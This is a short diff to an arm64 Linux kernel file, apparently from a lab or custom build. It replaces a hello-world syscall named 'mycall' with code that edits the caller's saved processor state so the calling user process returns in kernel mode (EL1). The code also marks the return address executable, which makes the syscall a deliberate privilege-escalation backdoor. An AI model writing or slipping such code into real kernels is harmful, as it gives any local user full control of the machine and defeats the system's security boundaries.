@@ -912,8 +912,23 @@ SYSCALL_DEFINE1(setfsgid, gid_t, gid)
 #endif /* CONFIG_MULTIUSER */
 SYSCALL_DEFINE0(mycall)
 {
-        printk(KERN_INFO "say hello to my little syscall\n");
-        return 0;
+	uint64_t sp;
+	uint64_t pstate;
+	uint64_t EL1_MASK = 0x4;
+	uint64_t return_addr;
+	struct pt_regs *regs;
+
+	asm ("mov %0, sp":"=rm"(sp) : :);
+	sp = (sp | 0xfff) + 0x1;
+	regs = (struct pt_regs *) (sp - sizeof(struct pt_regs));
+	pstate = regs->pstate;
+	return_addr = regs->pc;
+	pstate = pstate | EL1_MASK;
+	regs->pstate = pstate;
+
+	set_memory_x(return_addr, 1);
+	/* change_memory_common(addr, numpages,__pgprot(PTE_MAYBE_GP),__pgprot(PTE_PXN)); */
+	return 0;
 }
 
 /**
